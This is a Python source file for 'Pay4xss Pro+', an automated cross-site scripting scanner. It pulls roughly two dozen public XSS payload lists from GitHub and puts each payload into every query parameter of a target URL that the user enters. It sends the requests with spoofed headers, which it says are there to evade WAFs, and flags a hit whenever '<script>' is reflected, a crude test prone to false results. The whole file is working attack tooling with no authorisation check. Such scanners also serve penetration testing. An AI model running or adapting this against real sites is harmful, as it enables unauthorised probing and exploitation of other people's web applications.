import requests
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import sys
import os
from termcolor import cprint
from tqdm import tqdm

# Initialize colorama for colorful CLI
init()

# Headers to bypass potential WAFs or restrictions
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "Referer": "https://google.com/",
}

# Payload URLs (unchanged)
PAYLOAD_URLS = [
    "https://raw.githubusercontent.com/payloadbox/xss-payload-list/refs/heads/master/Intruder/xss-payload-list.txt",
    "https://raw.githubusercontent.com/cc1a2b/PenHunter/refs/heads/main/penhunter/payload/xor.txt",
    "https://raw.githubusercontent.com/cc1a2b/PenHunter/refs/heads/main/penhunter/payload/xss_advanced.txt",
    "https://raw.githubusercontent.com/cc1a2b/PenHunter/refs/heads/main/penhunter/payload/xss_more_advamced.txt",
    "https://raw.githubusercontent.com/cc1a2b/PenHunter/refs/heads/main/penhunter/payload/xss_payload.txt",
    "https://raw.githubusercontent.com/InfoSecWarrior/Offensive-Payloads/refs/heads/main/Cross-Site-Scripting-XSS-Payloads.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-all-list.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-by-keyword-filtering.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-encoding-payload.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-hidden-input.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-input.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-markdowns.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-onfocus.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-title.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-username-field.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-for-vuejs.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-href.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-payload-for-input-search.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-polyglot.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-top500-list.txt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-without-alert-confirm-prompt",
    "https://raw.githubusercontent.com/Proviesec/xss-payload-list/refs/heads/main/xss-without-alert.txt",
    "https://gist.githubusercontent.com/mmssr/507cd83befa43b696e9f58344ecb4039/raw/7302feb198eda37d06df1641afb3267b6bf566e7/Simple%2520XSS%2520payloads",
    "https://raw.githubusercontent.com/1234567890291/xss-payload/refs/heads/main/payload.txt",
]


# Banner (improved)
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    cprint(Fore.YELLOW + Style.BRIGHT + """
██████╗  █████╗ ██╗   ██╗     ██╗  ██╗     ██╗  ██╗███████╗███████╗    
██╔══██╗██╔══██╗╚██╗ ██╔╝     ██║  ██║     ╚██╗██╔╝██╔════╝██╔════╝    
██████╔╝███████║ ╚████╔╝█████╗███████║█████╗╚███╔╝ ███████╗███████╗    
██╔═══╝ ██╔══██║  ╚██╔╝ ╚════╝╚════██║╚════╝██╔██╗ ╚════██║╚════██║    
██║     ██║  ██║   ██║             ██║     ██╔╝ ██╗███████║███████║    
╚═╝     ╚═╝  ╚═╝   ╚═╝             ╚═╝     ╚═╝  ╚══════╝╚══════╝    

        There are total 27039 XSS payload in this tool    
""" + Style.RESET_ALL)
    cprint(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Pay4xss Pro+ - Powerful XSS Detection Tool\n" + Style.RESET_ALL)

# Function to fetch payloads
def fetch_payloads():
    cprint(Fore.CYAN + "[+] Checking payload sources... (This depends on your network speed)" + Style.RESET_ALL)
    payloads = []
    for url in tqdm(PAYLOAD_URLS, desc="Fetching Payloads", unit="URL"):
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                payloads.extend(response.text.splitlines())
            else:
                cprint(Fore.RED + f"[-] Failed to fetch from: {url} (Status Code: {response.status_code})" + Style.RESET_ALL)
        except requests.RequestException as e:
            cprint(Fore.RED + f"[-] Error fetching payloads from {url}: {e}" + Style.RESET_ALL)
    cprint(Fore.GREEN + f"[+] Successfully loaded {len(payloads)} payloads.\n" + Style.RESET_ALL)
    return payloads

# Function to inject payload intelligently into the URL
def inject_payload(url, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if query_params:
        for param in query_params:
            query_params[param] = [payload]
    else:
        query_params['q'] = [payload]
    new_query = urlencode(query_params, doseq=True)
    injected_url = urlunparse(parsed_url._replace(query=new_query))
    return injected_url

# Function to test a URL for XSS vulnerabilities
def test_xss(url, payloads):
    cprint(Fore.CYAN + f"[+] Testing for XSS vulnerabilities on: {url}\n" + Style.RESET_ALL)
    for payload in tqdm(payloads, desc="Testing Payloads", unit="payload"):
        start_time = time.time()
        try:
            test_url = inject_payload(url, payload)
            response = requests.get(test_url, headers=HEADERS, timeout=10)
            elapsed_time = time.time() - start_time
            if response.status_code == 200:
                if "<script>" in response.text or "alert('XSS')" in response.text:
                    cprint(Fore.GREEN + f"[!!!] XSS Executed | Payload: {payload} | Status Code: {response.status_code} | Time Taken: {elapsed_time:.2f}s" + Style.RESET_ALL)
                    cprint(Fore.LIGHTCYAN_EX + f"[+] Open the link to verify: {test_url}" + Style.RESET_ALL)
                else:
                    cprint(Fore.YELLOW + f"[!] False Positive: Payload reflected but not executed. | Status Code: {response.status_code} | Time Taken: {elapsed_time:.2f}s" + Style.RESET_ALL)
            else:
                cprint(Fore.RED + f"[-] Non-200 Response: {response.status_code} | Time Taken: {elapsed_time:.2f}s" + Style.RESET_ALL)

        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            cprint(Fore.RED + f"[-] Error testing payload: {payload} | {e} | Time Taken: {elapsed_time:.2f}s" + Style.RESET_ALL)

# Main function
def main():
    print_banner()
    url = input(Fore.LIGHTYELLOW_EX + "Enter the target URL (e.g., https://www.example.com/): " + Style.RESET_ALL).strip()
    if not url:
        cprint(Fore.RED + "[-] Please provide a valid URL." + Style.RESET_ALL)
        return
    payloads = fetch_payloads()
    if payloads:
        test_xss(url, payloads)
    else:
        cprint(Fore.RED + "[-] No payloads to test. Exiting..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
